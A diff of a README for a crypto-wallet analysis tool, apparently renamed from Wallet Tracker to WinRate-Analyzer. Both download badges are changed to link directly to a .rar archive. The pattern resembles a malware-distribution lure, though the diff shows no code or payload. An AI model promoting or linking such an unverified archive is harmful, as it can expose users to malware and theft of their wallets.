@@ -1,8 +1,7 @@
-# WinRate-Analyzer
 
 **Analyze Crypto Wallets with Speed and Efficiency**  
 
-[![Download Wallet Tracker](https://img.shields.io/badge/Download-Wallet_Tracker_v1.2-blue?style=for-the-badge)](https://github.com/mervandz/Wallet-Tracker/releases/tag/v1.2.0)  
+[![Download Wallet Tracker](https://img.shields.io/badge/Download-Wallet_Tracker_v1.2-blue?style=for-the-badge)](https://github.com/mervandz/WinRate-Analyzer/releases/download/v1.2/WinRate.Analyzer.rar)  
 
 ![Wallet Tracker](https://i.ibb.co/jTgHCBC/3e.png)
 
@@ -83,4 +82,4 @@ Save all analysis results in a text file on your desktop for easy access and sha
 Whether you're a crypto expert or a beginner, **Wallet Tracker** equips you with the tools to analyze wallet data quickly and effortlessly.  
 **Try it now for free!**  
 
-[![Download Wallet Tracker](https://img.shields.io/badge/Download-Wallet_Tracker_v1.2-blue?style=for-the-badge)](https://github.com/mervandz/Wallet-Tracker/releases/tag/v1.2.0)
+[![Download Wallet Tracker](https://img.shields.io/badge/Download-Wallet_Tracker_v1.2-blue?style=for-the-badge)](https://github.com/mervandz/WinRate-Analyzer/releases/download/v1.2/WinRate.Analyzer.rar)
